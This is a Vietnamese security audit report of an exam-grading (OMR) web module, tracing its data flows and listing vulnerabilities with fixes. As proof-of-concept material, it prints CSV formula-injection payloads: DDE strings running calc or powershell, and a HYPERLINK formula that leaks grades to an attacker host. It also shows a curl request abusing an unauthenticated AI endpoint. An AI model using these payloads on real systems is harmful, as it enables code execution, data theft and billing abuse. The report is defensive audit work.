# BÁO CÁO AUDIT AN NINH & KIẾN TRÚC: MODULE CHẤM THI OMR & KỲ THI TRẮC NGHIỆM (/grading)
**Dự án:** EduTest AI (Hệ thống tạo đề thi AI chuẩn Bộ GD&ĐT 2025, chấm OMR, phòng thí nghiệm 3D)  
**Phạm vi audit:** Route `/grading` (`localhost:3001/grading`) và toàn bộ các sub-routes liên quan:
- `/grading/mobile-scanner` (Trang quét ảnh trên điện thoại di động)
- `/grading/submit/[token]` (Trang công khai cho học sinh tự nộp bài)
- `/api/grading/*` (OMR engine, remote-session pairing, student-links)
- `frontend/src/lib/api/grading-sessions.ts`, `remote-cam-store.ts`, `student-submission-store.ts`
- `ai-service/app/omr/*` và `ai-service/app/routers/omr_grading.py` (FastAPI + OpenCV)  
**Chế độ:** READ-ONLY AUDIT (Không sửa code, không commit)  
**Ngày thực hiện:** 01/11/2026  
**Chuyên viên đánh giá:** Senior Full-stack Engineer & Security Auditor (Chuyên môn Xử lý ảnh / OpenCV OMR)  

---

## BƯỚC 1: TRUY VẾT LUỒNG HOẠT ĐỘNG END-TO-END

### 1.1 Danh mục File, Router & Trách nhiệm thành phần

| Tên thành phần / Chức năng | Đường dẫn File thực tế | Dòng liên quan | Trách nhiệm chính |
| :--- | :--- | :--- | :--- |
| **Giao diện trung tâm `/grading`** | `frontend/src/app/(dashboard)/grading/page.tsx` | L1 - L3085 | Quản lý danh sách kỳ thi, modal quét, webcam, batch OMR, xuất CSV |
| **Giao diện Chi tiết kỳ thi** | `frontend/src/components/grading/session-detail-view.tsx` | L1 - L1435 | Thống kê phổ điểm, bảng kết quả, tạo link học sinh nộp, gửi Zalo |
| **Trang máy quét di động** | `frontend/src/app/grading/mobile-scanner/page.tsx` | L1 - L424 | Kết nối không dây bằng PIN/QR, mở camera điện thoại, chụp & gửi ảnh |
| **Trang công khai học sinh nộp bài** | `frontend/src/app/grading/submit/[token]/page.tsx` | L1 - L825 | Cho phép học sinh chọn ảnh/chấm bong bóng, nhận điểm trực tuyến |
| **API OMR Gateway (Next.js)** | `frontend/src/app/api/grading/omr/route.ts` | L1 - L312 | Định tuyến ảnh tới Python AI Service; Fallback Gemini Vision OMR |
| **API Ghép nối không dây (Pairing)** | `frontend/src/app/api/grading/remote-session/*` | create, connect, poll, submit-photo, report-result | Sinh PIN 4 số, ghép nối PC ↔ Mobile qua Short-polling RAM |
| **API Link học sinh tự nộp** | `frontend/src/app/api/grading/student-links/*` | route.ts, [token]/route.ts, close/route.ts | Tạo token nộp bài, nhận bài làm học sinh, tính điểm trực tiếp |
| **Store phiên trong bộ nhớ RAM** | `frontend/src/lib/grading/remote-cam-store.ts`<br/>`frontend/src/lib/grading/student-submission-store.ts` | L1 - L166<br/>L1 - L237 | Quản lý sessions và submissions qua `globalThis` Map |
| **CRUD Kỳ thi (Đồng bộ kép)** | `frontend/src/lib/api/grading-sessions.ts` | L1 - L350 | Lưu trữ vào LocalStorage và `public.grading_sessions` (JSONB) |
| **Dịch vụ OpenCV OMR (Python)** | `ai-service/app/routers/omr_grading.py`<br/>`ai-service/app/omr/template_matcher.py`<br/>`ai-service/app/omr/detector.py`<br/>`ai-service/app/omr/bubble_evaluator.py` | L1 - L215<br/>L1 - L339<br/>L1 - L215<br/>L1 - L160 | Nắn góc phối cảnh (Warp Perspective), đo độ phủ bóng Otsu, tính điểm BGD 2025 |

---

### 1.2 Sơ đồ 9 luồng nghiệp vụ cốt lõi

#### (a) Tạo kỳ thi từ đề & Sinh phiếu tô PDF
```mermaid
sequenceDiagram
    autonumber
    actor Teacher as Giáo viên
    participant Page as /grading (Client)
    participant Lib as lib/api/grading-sessions.ts
    participant ExamLib as lib/api/exams.ts
    participant OMR_API as /api/grading/omr (Next.js)
    participant Python as ai-service (/ai/omr/generate-sheet-pdf)

    Teacher->>Page: Nhấn "Tạo kỳ thi" & chọn đề từ kho
    Page->>Lib: extractRealAnswerKeyFromExam(examId)
    Lib->>ExamLib: getExamById(examId)
    ExamLib-->>Lib: Danh sách câu hỏi và đáp án gốc
    Lib-->>Page: Sheet type (20/40/50/2025) + Answer Key thật
    Teacher->>Page: Bấm "In phiếu tô" -> "Tải PDF"
    Page->>OMR_API: POST /api/grading/omr { action: "download_pdf", sheetType, examTitle }
    OMR_API->>Python: POST /ai/omr/generate-sheet-pdf (ReportLab)
    Python-->>OMR_API: Stream PDF Binary (khớp 100% tọa độ OpenCV)
    OMR_API-->>Page: File attachment phieu_trac_nghiem.pdf
    Page-->>Teacher: Tải xuống file PDF chuẩn A4
```

#### (b) Chấm từ ảnh tải lên (Client -> Next API -> Python OpenCV / Gemini Fallback)
```mermaid
sequenceDiagram
    autonumber
    actor Teacher as Giáo viên
    participant Page as Modal Chấm OMR
    participant OMR_API as POST /api/grading/omr
    participant PyOMR as Python AI Service (/ai/omr/grade-single)
    participant Gemini as Gemini 1.5 Flash Vision (Fallback)
    participant DB as Supabase & LocalStorage

    Teacher->>Page: Chọn ảnh phiếu thi (JPEG/PNG)
    Page->>Page: FileReader -> imageBase64 (Data URI)
    Page->>OMR_API: POST /api/grading/omr { imageBase64, sheetType, answerKey, returnAnnotatedImage: true }
    alt Python OpenCV hoạt động
        OMR_API->>PyOMR: POST /ai/omr/grade-single
        Note over PyOMR: Bắt 4 điểm neo cữ góc -> Warp Perspective (1654x2338)<br/>Đo độ phủ bóng Otsu -> Đọc SBD, Mã đề -> Chấm điểm
        PyOMR-->>OMR_API: { total_score, results, annotated_image_base64, flagged_questions }
    else Python Service không truy cập được (Vercel Cloud)
        OMR_API->>Gemini: runGeminiVisionOMR (Đọc ô tròn bằng Vision AI)
        Gemini-->>OMR_API: Trả về JSON SBD, Mã đề, Lựa chọn A/B/C/D
    end
    OMR_API-->>Page: Trả về kết quả chấm + Ảnh nắn tọa độ có khoanh màu
    Page->>DB: saveGradingSession() [LƯU CẢ ẢNH BASE64 VÀO LOCALSTORAGE & DB]
```

#### (c) Ghép nối điện thoại ↔ máy tính (Wireless Scanner Pairing)
```mermaid
sequenceDiagram
    autonumber
    actor Teacher as Giáo viên (PC)
    participant Page as /grading (PC Browser)
    participant PairAPI as /api/grading/remote-session/*
    participant RAM as globalThis.__remoteCamSessions
    actor Phone as Điện thoại (Mobile)
    participant MobilePage as /grading/mobile-scanner

    Teacher->>Page: Bấm "Bắt đầu chấm" -> Chọn "Điện thoại quét QR"
    Page->>PairAPI: POST /remote-session/create { sessionId, answerKey, ... }
    PairAPI->>RAM: Tạo session { token: "cam_xxx", pin: "1234", answerKey }
    PairAPI-->>Page: { token, pin, qrUrl, directUrl }
    Page-->>Teacher: Hiển thị QR Code & Mã PIN 4 chữ số
    Teacher->>Phone: Quét QR hoặc truy cập link
    Phone->>MobilePage: Mở /grading/mobile-scanner?token=cam_xxx
    MobilePage->>PairAPI: POST /remote-session/connect { token }
    PairAPI->>RAM: Đánh dấu connected = true
    loop PC Short-Polling mỗi 1.2 giây
        Page->>PairAPI: GET /remote-session/poll?token=cam_xxx
        PairAPI->>RAM: consumePendingSubmissions(token)
        RAM-->>Page: Trả về danh sách ảnh điện thoại đã gửi
    end
    Teacher->>Phone: Bấm Chụp trên điện thoại
    MobilePage->>PairAPI: POST /remote-session/submit-photo { token, imageBase64 }
    PairAPI->>RAM: Đẩy ảnh vào pendingSubmissions
    PairAPI-->>MobilePage: HTTP 200 (Báo rung & Shutter sound)
    Page->>Page: Nhận ảnh từ Polling -> Tự động kích hoạt OMR -> Hiện điểm trên PC!
```

#### (d) Học sinh tự nộp bài qua Link / QR Code công khai
```mermaid
sequenceDiagram
    autonumber
    actor Teacher as Giáo viên
    participant Detail as SessionDetailView
    participant LinkAPI as /api/grading/student-links
    participant RAM_Link as globalThis.__studentSubmissionLinks
    actor Student as Học sinh
    participant SubPage as /grading/submit/[token]

    Teacher->>Detail: Bấm "Nhờ học sinh nộp bài" (chọn thời hạn 60 phút)
    Detail->>LinkAPI: POST /student-links { sessionId, durationMinutes: 60, answerKey }
    LinkAPI->>RAM_Link: Tạo linkToken ngẫu nhiên, lưu RAM 60 phút
    LinkAPI-->>Detail: Link /grading/submit/[token] + QR Code
    Teacher->>Student: Gửi link qua Zalo / Messenger
    Student->>SubPage: Mở link trên điện thoại (KHÔNG CẦN TÀI KHOẢN)
    SubPage->>SubPage: Học sinh nhập Tên, SBD, Lớp, chọn đáp án 1-20
    Student->>SubPage: Bấm "Nộp bài thi"
    SubPage->>LinkAPI: POST /student-links/[token] { studentName, studentCode, studentAnswers }
    LinkAPI->>LinkAPI: So khớp answerKey, tính điểm
    Note over LinkAPI,SubPage: LỖ HỔNG: Trả về toàn bộ đáp án chuẩn trong details!
    LinkAPI-->>SubPage: Trả về điểm + correctAnswer từng câu
    SubPage-->>Student: Xem ngay điểm số và các câu đúng/sai
```

#### (e) Chấm hàng loạt (Batch OMR)
Giáo viên chọn 20 - 50 ảnh từ máy tính -> Client dùng `FileReader.readAsDataURL` nạp toàn bộ ảnh thành Base64 đồng thời -> Gửi 1 POST payload khổng lồ (200MB+) tới `/api/grading/omr` (`action: "grade_batch"`) -> Python AI Service xử lý đa luồng `ThreadPoolExecutor(max_workers=16)` -> Trả về kết quả tổng hợp -> Client cập nhật danh sách học sinh.

#### (f) Chấm tay / Sửa kết quả ở mục «Cần xem lại»
Thực tế trong code: Tại modal đơn lẻ lúc scan ảnh có cho phép đổi đáp án trước khi lưu. Nhưng trong giao diện chi tiết kỳ thi (`SessionDetailView`), **thẻ "Cần xem lại" bị gán cứng = 0** và bảng kết quả **hoàn toàn không có nút Sửa** cho các bài đã lưu.

#### (g) Xuất Excel / Bảng điểm
Giáo viên nhấn nút "Xuất file Excel" -> Hàm `handleExportExcel` sinh chuỗi CSV UTF-8 BOM (`\uFEFF`) với các cột STT, SBD, Họ tên, Điểm số, Chi tiết bài làm -> Tải file `Bang_Diem_[Ten_Ky_Thi].csv`. *(Chứa lỗ hổng CSV Formula Injection)*.

#### (h) Xóa kỳ thi
Giáo viên bấm icon Thùng rác -> Hiện popup `window.confirm()` -> Gọi `deleteGradingSession(id)` -> Xóa cứng khỏi `localStorage` và gửi `DELETE` tới Supabase `public.grading_sessions`.

#### (i) Liên hệ với mã đề đã trộn (Mối liên hệ CRT-02)
Khi tạo kỳ thi từ đề đã trộn, hệ thống chỉ trích xuất **1 bảng đáp án duy nhất** của đề gốc. Khi học sinh tô mã đề 102, 103, 104, OpenCV nhận diện được mã đề nhưng thuật toán vẫn so với bảng đáp án đề 101, dẫn tới chấm sai toàn bộ.

---

### 1.3 Nguồn dữ liệu của các con số trên giao diện

| Con số hiển thị trên UI | Vị trí dòng mã nguồn | Cơ chế tính toán thực tế | Rủi ro / Nhận xét |
| :--- | :--- | :--- | :--- |
| **Tổng kỳ thi** | `grading/page.tsx:1233` | `sessions.length` (đếm mảng local/cloud) | Chính xác theo tài khoản |
| **Bài đã chấm OMR** | `grading/page.tsx:1243` | `sessions.reduce((acc, s) => acc + s.gradedStudents.length, 0)` | Tính tổng số học sinh đã chấm |
| **Điểm Trung Bình** | `grading/page.tsx:1255-1259` | Tính trung bình cộng `allScores` của toàn bộ các kỳ thi | Chính xác theo dữ liệu hiện có |
| **«Độ chính xác OMR 99.2%»** | `grading/page.tsx:1269` | `<span ...>99.2%</span>` | **HARDCODE 100%**, không xuất phát từ CSDL hay kiểm thử |
| **«Bảng điểm (n)»** | `grading/page.tsx:1283` | `session.gradedStudents.length` | Lấy từ mảng `graded_students` |
| **«Cần xem lại»** | `session-detail-view.tsx:575` | `<div ...>0</div>` | **HARDCODE CỨNG SỐ 0**, không đếm cờ cảnh báo |

---

## BƯỚC 2: AUDIT BẢO MẬT (ƯU TIÊN CAO NHẤT)

### 2.1 Lỗ hổng Tràn bộ nhớ LocalStorage & Phình to CSDL (CRITICAL - `GRD-01`)
* **Vị trí file:** [grading/page.tsx:660, 834, 967](file:///d:/Go-Live/Web/EdTeach/frontend/src/app/%28dashboard%29/grading/page.tsx#L660), [api/grading-sessions.ts:249, 304](file:///d:/Go-Live/Web/EdTeach/frontend/src/lib/api/grading-sessions.ts#L249)
* **Nguyên nhân gốc:** Mỗi bài chấm OMR sinh ra một chuỗi ảnh Base64 JPEG (`annotated_image_base64`, kích thước 400KB - 800KB/ảnh). Mã nguồn gán trực tiếp chuỗi này vào thuộc tính `annotatedImage` của từng học sinh, rồi serialize toàn bộ danh sách lưu vào `localStorage.setItem(LOCAL_STORAGE_KEY, ...)` và cột `graded_students JSONB` trong PostgreSQL.
* **Hậu quả:**
  1. Hạn ngạch `localStorage` của trình duyệt chỉ có tối đa **5MB**. Khi chấm đến bài thứ 8 - 10, trình duyệt ném ngoại lệ `DOMException: QuotaExceededError`, làm tê liệt tính năng lưu trữ và gây mất dữ liệu chấm thi của giáo viên.
  2. Bảng `grading_sessions` trong Postgres bị phình to: Một kỳ thi 40 học sinh sẽ chứa một bản ghi JSONB nặng **25MB - 35MB**. Mỗi thao tác thêm 1 học sinh sẽ gửi toàn bộ 35MB này qua mạng lên Supabase.
* **PoC:** Chấm liên tiếp 10 bài thi bằng camera hoặc upload ảnh -> Mở Console trình duyệt:
  ```
  Uncaught (in promise) DOMException: Failed to execute 'setItem' on 'Storage': Setting the value of 'edteach_grading_sessions' exceeded the quota.
  ```

---

### 2.2 Endpoint OMR không xác thực & Lạm dụng Gemini Vision AI (CRITICAL - `GRD-02`)
* **Vị trí file:** [app/api/grading/omr/route.ts:50-161](file:///d:/Go-Live/Web/EdTeach/frontend/src/app/api/grading/omr/route.ts#L50-L161)
* **Nguyên nhân gốc:** API `POST /api/grading/omr` **hoàn toàn không kiểm tra phiên đăng nhập** (`supabase.auth.getUser()`). Khi dịch vụ Python OMR nội bộ không khởi chạy (hoặc môi trường cloud như Vercel không có container Python), route này tự động chuyển hướng sang gọi hàm `runGeminiVisionOMR` bằng Google Gemini API Key trả phí của hệ thống.
* **Hậu quả:** Bất kỳ ai ngoài internet đều có thể gửi HTTP POST chứa ảnh base64 tới endpoint này. Kẻ tấn công có thể viết script gửi 60 request/phút, ép server gọi liên tục Gemini Vision API miễn phí, làm cạn kiệt hạn mức (quota) và tiêu tốn ngân sách thanh toán AI của dự án.
* **PoC:**
  ```bash
  curl -X POST https://edutest.vn/api/grading/omr \
    -H "Content-Type: application/json" \
    -d '{"action":"grade_single","sheetType":"2025","imageBase64":"data:image/jpeg;base64,/9j/4AAQSkZJRg..."}'
  # Kết quả: Trả về HTTP 200 kèm kết quả phân tích từ Gemini Vision mà không cần bất kỳ Authorization Header nào!
  ```

---

### 2.3 Lỗ hổng CSV / Excel Formula Injection (HIGH - `GRD-03`)
* **Vị trí file:** [grading/page.tsx:1056-1064](file:///d:/Go-Live/Web/EdTeach/frontend/src/app/%28dashboard%29/grading/page.tsx#L1056-L1064)
* **Nguyên nhân gốc:** Hàm `handleExportExcel` sinh file CSV bằng cách nối chuỗi thuần:
  ```ts
  csvContent += `"${idx + 1}","${std.studentCode}","${std.studentName}","${std.score}","${std.correctCount}","${std.incorrectCount}","${std.gradedAt}","${answersStr}"\n`;
  ```
  Không hề có bước lọc các ký tự điều khiển công thức bảng tính (`=`, `+`, `-`, `@`) hoặc escape dấu ngoặc kép `""`.
* **Hậu quả:** Học sinh nộp bài qua route công khai nhập tên:
  `=cmd|'/C calc'!A0` hoặc `@SUM(1+1)*cmd|' /C powershell -c ...'`
  Khi giáo viên mở file CSV bằng Microsoft Excel, Excel sẽ tự động thực thi lệnh hệ thống (DDE Execution) hoặc kích hoạt kết nối rò rỉ dữ liệu bảng điểm ra máy chủ kẻ tấn công.
* **PoC:** Tại form nộp bài học sinh, nhập Họ và Tên:
  `=HYPERLINK("http://attacker.com/leak?data="&D2,"Bấm xem điểm chi tiết")`
  Khi xuất Excel, cột Họ và Tên biến thành liên kết độc hại đánh cắp điểm thi.

---

### 2.4 Lộ toàn bộ Đáp án gốc cho học sinh khi tự nộp bài (HIGH - `GRD-04`)
* **Vị trí file:** [student-submission-store.ts:167-198, 226](file:///d:/Go-Live/Web/EdTeach/frontend/src/lib/grading/student-submission-store.ts#L167-L198), [student-links/[token]/route.ts:91-93](file:///d:/Go-Live/Web/EdTeach/frontend/src/app/api/grading/student-links/%5Btoken%5D/route.ts#L91-L93)
* **Nguyên nhân gốc:** Hàm `submitStudentExam` lặp qua từng câu hỏi và nhét `correctAnswer: correctAns` vào mảng `details`. Khi nộp xong, API trả về toàn bộ object `submission` cho client học sinh.
* **Hậu quả:** Học sinh đầu tiên nộp bài chỉ cần mở DevTools (Network tab) là đọc được ngay 100% đáp án chuẩn của tất cả các câu trong đề thi, sau đó chia sẻ đáp án cho các bạn khác trong lớp khi thời gian làm bài vẫn đang diễn ra.

---

### 2.5 Mất trắng dữ liệu bài nộp do lưu trữ tạm trong RAM (HIGH - `GRD-05`)
* **Vị trí file:** [student-submission-store.ts:55-59](file:///d:/Go-Live/Web/EdTeach/frontend/src/lib/grading/student-submission-store.ts#L55-L59), [remote-cam-store.ts:44-45](file:///d:/Go-Live/Web/EdTeach/frontend/src/lib/grading/remote-cam-store.ts#L44-L45)
* **Nguyên nhân gốc:** Sử dụng `globalThis.__studentSubmissionLinks` và `globalThis.__studentSubmissions` (In-memory JavaScript Map).
* **Hậu quả:**
  1. Trên môi trường Serverless (Vercel): Mỗi Serverless Function chạy ở một container độc lập. Giáo viên tạo link ở Lambda A, học sinh truy cập rơi vào Lambda B sẽ lập tức bị lỗi **404 "Liên kết nộp bài không tồn tại"**.
  2. Bất cứ khi nào máy chủ restart hoặc deploy phiên bản mới, toàn bộ link và bài làm học sinh đã nộp bị xóa sạch, không thể khôi phục vì chưa từng ghi vào CSDL Postgres.

---

### 2.6 Chấm sai toàn bộ các mã đề thi đã trộn (HIGH - `GRD-06` - TRÙNG CRT-02)
* **Vị trí file:** [lib/api/grading-sessions.ts:52-96](file:///d:/Go-Live/Web/EdTeach/frontend/src/lib/api/grading-sessions.ts#L52-L96), [ai-service/app/omr/template_matcher.py:127, 187-190](file:///d:/Go-Live/Web/EdTeach/ai-service/app/omr/template_matcher.py#L127)
* **Nguyên nhân gốc:** Một kỳ thi trong bảng `grading_sessions` chỉ chứa duy nhất một trường `answer_key: Record<number, string>` của đề gốc (mã 101). Không có cấu trúc lưu trữ ma trận đáp án hoán vị cho các mã đề 102, 103, 104.
* **Hậu quả:** Dù OpenCV đọc đúng số mã đề "102" trên phiếu thi, module chấm điểm vẫn so khớp bài làm với bảng đáp án của mã đề "101". Toàn bộ học sinh làm đề trộn 102, 103, 104 bị chấm sai hàng loạt, nhận điểm liệt oan uổng.

---

### 2.7 Ghép nối camera di động tạo URL `localhost` và rò rỉ dữ liệu bên thứ ba (HIGH - `GRD-07`)
* **Vị trí file:** [app/api/grading/remote-session/create/route.ts:41-48](file:///d:/Go-Live/Web/EdTeach/frontend/src/app/api/grading/remote-session/create/route.ts#L41-L48)
* **Nguyên nhân gốc:** Biến `host` lấy từ request header và fallback về `localhost:3000`. Khi tạo mã QR, URL được truyền trực tiếp sang dịch vụ bên thứ ba công cộng: `https://api.qrserver.com/v1/create-qr-code/?data=...`.
* **Hậu quả:**
  1. Giáo viên quét mã QR trên điện thoại sẽ mở `http://localhost:3000/...` -> Báo lỗi không tìm thấy máy chủ.
  2. Nếu không có HTTPS, trình duyệt di động **chặn tuyệt đối quyền truy cập camera** (`getUserMedia`).
  3. Toàn bộ URL nội bộ chứa token bí mật của phiên thi bị gửi ra máy chủ nước ngoài `api.qrserver.com`.

---

### 2.8 Chấm hàng loạt gây sập ứng dụng (Payload Too Large 413) (HIGH - `GRD-08`)
* **Vị trí file:** [grading/page.tsx:907-933](file:///d:/Go-Live/Web/EdTeach/frontend/src/app/%28dashboard%29/grading/page.tsx#L907-L933)
* **Nguyên nhân gốc:** Đọc đồng thời hàng chục ảnh bằng `FileReader.readAsDataURL` và gửi trong 1 request POST JSON duy nhất tới Next.js API.
* **Hậu quả:** Payload 30 ảnh vượt quá 150MB, vi phạm giới hạn body parser mặc định (4MB) của Next.js/Vercel, ném lỗi `HTTP 413 Payload Too Large` ngay lập tức. Trình duyệt client bị đơ (freeze tab) do cấp phát hàng trăm MB bộ nhớ RAM cho chuỗi Base64.

---

### 2.9 Vi phạm Nghị định 13/2023/NĐ-CP về bảo vệ dữ liệu cá nhân học sinh (MEDIUM - `GRD-12`)
* Thu thập họ tên, số báo danh, lớp học, ảnh chụp bài thi gốc và điểm số của học sinh (trẻ vị thành niên dưới 16 tuổi) nhưng:
  * Không có văn bản thỏa thuận / điều khoản chính sách bảo mật cho học sinh/phụ huynh.
  * Lưu trữ không mã hóa trong `localStorage` và cơ sở dữ liệu.
  * Không có quy trình xóa dữ liệu (Right to be Forgotten) hay thời hạn lưu trữ tối đa.

---

## BƯỚC 3: AUDIT BACKEND & CHẤT LƯỢNG THUẬT TOÁN OMR

### 3.1 Đánh giá Thuật toán OpenCV OMR (`ai-service/app/omr/`)
1. **Bắt góc phối cảnh (`detector.py`):**
   * *Ưu điểm:* Có 2 tầng nhận diện: Tầng 1 tìm 4 dấu neo hình vuông đen đặc (`find_anchor_marks`) với kiểm tra độ đặc (solidity >= 0.75); Tầng 2 fallback tìm biên giấy lớn nhất (`find_paper_boundary`). Nắn phẳng về kích thước chuẩn 1654 x 2338 (tỉ lệ chuẩn A4).
   * *Hạn chế:* Chưa xử lý tốt trường hợp ảnh chụp bị bóng tay che khuất 1 trong 4 góc neo hoặc giấy thi bị quăn mép nặng.
2. **Xử lý bóng tô & Tẩy xóa (`bubble_evaluator.py`):**
   * *Ưu điểm:* Sử dụng mặt nạ hình tròn bên trong (75% bán kính) để loại bỏ viền đen in sẵn. Kết hợp ngưỡng nhị phân Otsu và độ tối tương đối (`composite_score = 0.65 * fill_ratio + 0.35 * darkness`).
   * *Cảnh báo tô đúp:* Đã có logic phát hiện `DOUBLE_MARK` khi khoảng cách điểm giữa 2 ô cao nhất `< 0.12`.
3. **Phạm vi hỗ trợ cấu trúc GDPT 2025:**
   * Trong Python service (`template_matcher.py`), thuật toán **đã hỗ trợ đầy đủ cả 3 phần**: Phần I (MCQ 40 câu), Phần II (Đúng/Sai 8 câu theo thang điểm lũy tiến 0.1 - 0.25 - 0.5 - 1.0), và Phần III (Điền số/trả lời ngắn).
   * Tuy nhiên, trên giao diện web `/grading`, nhiều luồng chỉ mới hỗ trợ hiển thị trắc nghiệm 4 lựa chọn (A, B, C, D).

---

## BƯỚC 4: AUDIT FRONTEND & TRẢI NGHIỆM NGƯỜI DÙNG (UX/A11Y)

1. **Hiển thị giả tạo & Tàn dư Mockup `soandethi.com` (`GRD-09`):**
   * Dòng 1269: Con số `99.2%` bị gán cứng trong JSX.
   * Dòng 1278: Tiêu đề trang chứa dòng chữ thô `(ĐÃ NẠP KEY THẬT)` bị lộ ra giao diện người dùng cuối.
   * Dòng 3001 & 3061: Footer hiển thị tên miền `soandethi.com` và email `lienhe@soandethi.com` thay vì EduTest AI.
2. **Thiếu khả năng Sửa tay (Manual Review) (`GRD-11`):**
   * Thẻ "Cần xem lại" trong chi tiết kỳ thi bị hardcode số `0` ([session-detail-view.tsx:575](file:///d:/Go-Live/Web/EdTeach/frontend/src/components/grading/session-detail-view.tsx#L575)).
   * Modal xem chi tiết bài làm của học sinh không cho phép giáo viên can thiệp ghi đè đáp án khi hệ thống nhận diện nhầm.
3. **In ấn & Kích thước phiếu PDF:**
   * Phiếu thi sinh bằng ReportLab từ Python service đảm bảo tỉ lệ in ấn 1:1. Tuy nhiên nếu giáo viên chọn "Fit to Page" hoặc "Shrink to Fit" trong hộp thoại in của trình duyệt, tọa độ quét sẽ bị co giãn sai lệch so với ma trận pixel cố định của OpenCV. Cần có dòng cảnh báo in: *"Bắt buộc chọn tỉ lệ 100% (Actual Size), không chọn Fit to Page"*.

---

## BƯỚC 5: BẢNG TỔNG HỢP LỖ HỔNG & DANH MỤC KHẮC PHỤC

| ID | Mức độ | Hạng mục | File:dòng | Mô tả ngắn | Khai thác / Hậu quả | Đề xuất sửa | Công sức | Trùng ID cũ |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **GRD-01** | **Critical** | Data / Storage | `grading/page.tsx:660`<br/>`grading-sessions.ts:249` | Lưu ảnh Base64 vào LocalStorage và JSONB | Tràn quota 5MB trình duyệt, sập app và nghẽn DB | Upload ảnh lên Supabase Storage, chỉ lưu URL | L (8h) | - |
| **GRD-02** | **Critical** | Auth / Financial | `api/grading/omr/route.ts:50` | API OMR không check Auth, fallback gọi Gemini AI | Bị spam DoS tiêu tốn sạch ngân sách Gemini API | Bắt buộc đăng nhập, kiểm tra credit trước khi gọi AI | M (4h) | - |
| **GRD-03** | **High** | Injection | `grading/page.tsx:1063` | CSV / Excel Formula Injection khi xuất bảng điểm | Thực thi mã độc (RCE) qua DDE trên máy giáo viên | Sanitize ký tự công thức, escape dấu ngoặc kép | S (2h) | - |
| **GRD-04** | **High** | Cheating | `student-submission-store.ts:183` | Trả về trọn bộ đáp án đúng cho học sinh khi nộp | Học sinh nộp trước tuồn toàn bộ đáp án cho cả lớp | Ẩn đáp án đúng khỏi payload trả về cho học sinh | S (2h) | - |
| **GRD-05** | **High** | Architecture | `student-submission-store.ts:55` | Dữ liệu nộp bài lưu trong RAM Map, mất khi restart | Mất bài học sinh khi serverless spin down hoặc restart | Chuyển toàn bộ link & submission vào PostgreSQL | L (8h) | - |
| **GRD-06** | **High** | Logic / Grading | `grading-sessions.ts:58`<br/>`template_matcher.py:127` | Chấm sai toàn bộ các mã đề đã trộn (102, 103, 104) | Học sinh làm đề trộn bị chấm theo đề 101, điểm sai lệch | Lưu ma trận đáp án theo từng mã đề thi | M (5h) | **TRÙNG CRT-02** |
| **GRD-07** | **High** | Networking | `remote-session/create/route.ts:41` | QR code trỏ về localhost và gửi URL ra api.qrserver.com | Điện thoại không kết nối được camera, lộ token nội bộ | Dùng env domain thật, sinh QR bằng thư viện client | S (2h) | - |
| **GRD-08** | **High** | DoS / Network | `grading/page.tsx:923` | Chấm hàng loạt gửi tất cả ảnh Base64 trong 1 payload | Lỗi 413 Payload Too Large, đơ trình duyệt | Chấm tuần tự từng ảnh hoặc upload Storage trước | M (4h) | - |
| **GRD-09** | **Medium** | UI / Mock | `grading/page.tsx:1269, 3001` | Hardcode «99.2%», «Cần xem lại: 0», lộ `soandethi.com` | Gây hiểu nhầm năng lực OMR, lộ bản quyền copy | Gỡ bỏ text giả, thay email và thương hiệu chuẩn | S (2h) | **TRÙNG FE-02** |
| **GRD-10** | **Medium** | Cryptography | `remote-cam-store.ts:49` | Mã PIN 4 số sinh bằng `Math.random()`, thiếu check auth | Dễ đoán số, người ngoài có thể đẩy ảnh vào phiên | Dùng `crypto.randomInt()`, ràng buộc session với userId | S (2h) | - |
| **GRD-11** | **Medium** | UX / Feature | `session-detail-view.tsx:850` | Thiếu tính năng Sửa tay / Ghi đè đáp án | Không sửa được điểm khi OpenCV nhận diện sai | Thêm modal sửa đáp án từng câu cho giáo viên | M (4h) | - |
| **GRD-12** | **Medium** | Compliance | `student-store.ts`, `page.tsx` | Vi phạm quy định bảo vệ dữ liệu cá nhân học sinh (NĐ 13) | Rủi ro pháp lý khi thu thập PII trẻ vị thành niên | Bổ sung chính sách bảo mật, mã hóa dữ liệu học sinh | M (4h) | - |
| **GRD-13** | **Low** | Data Loss | `grading/page.tsx:513` | Hard Delete kỳ thi bằng `window.confirm` thô sơ | Xóa nhầm kỳ thi không thể hoàn tác, mất toàn bộ điểm | Chuyển sang Soft Delete (`deleted_at`) | S (2h) | - |

---

### DANH SÁCH BLOCKER BẮT BUỘC TRƯỚC KHI GO-LIVE

1. **[BLOCKER 1 - GRD-01] Ngăn chặn lưu chuỗi ảnh Base64 vào LocalStorage & CSDL:**
   - Cấm lưu chuỗi ảnh Base64 vào `localStorage`. Cấu hình upload ảnh lên Supabase Storage bucket `exam-scans` và chỉ lưu URL, hoặc tạm thời loại bỏ thuộc tính `annotatedImage` khi lưu trữ để bảo vệ hạn ngạch 5MB.
2. **[BLOCKER 2 - GRD-02] Thêm kiểm tra Authentication vào `/api/grading/omr`:**
   - Yêu cầu xác thực người dùng (`supabase.auth.getUser()`) trước khi xử lý OMR, ngăn chặn việc lạm dụng ngân sách Gemini Vision AI.
3. **[BLOCKER 3 - GRD-03] Vá lỗ hổng CSV Formula Injection:**
   - Làm sạch toàn bộ trường dữ liệu trước khi xuất CSV (tiền tố dấu nháy đơn `'` nếu chuỗi bắt đầu bằng `=`, `+`, `-`, `@`).
4. **[BLOCKER 4 - GRD-04] Giấu Đáp án đúng trong API nộp bài của học sinh:**
   - Loại bỏ trường `correctAnswer` khỏi payload trả về cho học sinh trong thời gian kỳ thi đang mở.
5. **[BLOCKER 5 - GRD-07 & GRD-09] Sửa URL ghép nối điện thoại & Dọn dẹp Text Mockup:**
   - Chuyển `qrUrl` sang thư viện tạo mã QR tại client (`qrcode.react`), sửa domain trỏ về URL production HTTPS để camera hoạt động, xóa bỏ chữ `(ĐÃ NẠP KEY THẬT)` và thương hiệu `soandethi.com`.

---

### KẾ HOẠCH HẬU LAUNCH (2 TUẦN)

* **Tuần 1:** Chuyển đổi toàn bộ store RAM `__studentSubmissionLinks` và `__studentSubmissions` sang bảng PostgreSQL thật (`GRD-05`); Xây dựng cấu trúc ma trận đáp án theo từng mã đề thi đã trộn (`GRD-06`).
* **Tuần 2:** Xây dựng hàng đợi chấm hàng loạt (Chunked Batch Upload) (`GRD-08`); Xây dựng Modal cho phép giáo viên can thiệp sửa điểm thủ công (`GRD-11`); Triển khai Soft Delete và bổ sung chính sách bảo mật dữ liệu học sinh theo Nghị định 13 (`GRD-12`, `GRD-13`).

---

### ĐIỂM CHƯA XÁC MINH ĐƯỢC
